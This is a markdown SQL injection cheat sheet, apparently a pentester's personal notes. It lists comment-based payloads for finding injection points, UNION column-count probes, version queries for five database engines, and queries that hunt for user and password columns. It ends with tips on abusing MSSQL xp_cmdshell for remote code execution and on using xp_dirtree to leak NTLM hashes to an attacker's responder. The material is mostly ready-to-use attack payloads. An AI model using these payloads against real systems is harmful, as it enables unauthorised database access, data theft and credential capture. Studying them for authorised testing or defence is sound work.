# Entry point
if the response is unchanged after one of these payloads (or an error is returned) - the parameter might be vulnerable to SQLi.

Oracle / MSSQL / PostgreSQL / MySQL / SQLite
```
 -- 
' -- 
" -- 
 /*
' /* 
" /* 
```
MySQL
```
 # 
' # 
" # 
```
example query: SELECT role,fullname FROM users WHERE id='1' # '
# UNION attack
if data is returned in the response, the database can be enumerated using a union attack.
in this case, the first step is to figure out how many columns are returned by the query.
personally I like to supply an id or a username that does not exist so no row is returned,
and then unioning a row of my choice until it is returned by the application:
```
-1' UNION SELECT 1; # 
-1' UNION SELECT 1,2: # 
-1' UNION SELECT 1,2,3; # and so on ...
```
after some of the numbers we supplied are reflected in the response, we can replace them with
other builtin methods and attributes to further enumerate the database.

```diff
SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
- 1" UNION SELECT 1,2,3 /*
"
```
# Version enumeration

PostgreSQL / MySQL / MariaDB
```
SELECT version()
```
MSSQL / MySQL
```
SELECT @@version
```
SQLite
```
SELECT sqlite_version()
```
Oracle
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

# Data exfiltration
some of the queries I like to run in order to enumerate the databse further are:

Oracle
```
SELECT DISTINCT owner FROM all_tables; -- list databases
SELECT table_name, column_name FROM all_tab_cols WHERE column_name LIKE '%ser%'; /* lists columns like User, username and user */
SELECT table_name, column_name FROM all_tab_cols WHERE column_name LIKE '%ass%'; -- same but for pass or Password
```
MSSQL
```
SELECT name FROM master.sys.databases;
SELECT t.name AS table_name, c.name AS column_name FROM sys.tables t JOIN sys.columns c ON t.object_id = c.object_id WHERE c.name LIKE '%ass%'; 
```
PostgreSQL
```
SELECT datname FROM pg_database;
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%ass%';
```
MySQL
```
SELECT table_name FROM information_shcema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema'); # list all non default table names
```
# Tricks
MSSQL can run system stored procedures such as xp_cmdshell which can be abused to move laterally.
xp_cmdshell -> direct RCE
xp_dirtree -> lists the contents of a folder. can be run against an attacker responder to get service user NTLM.
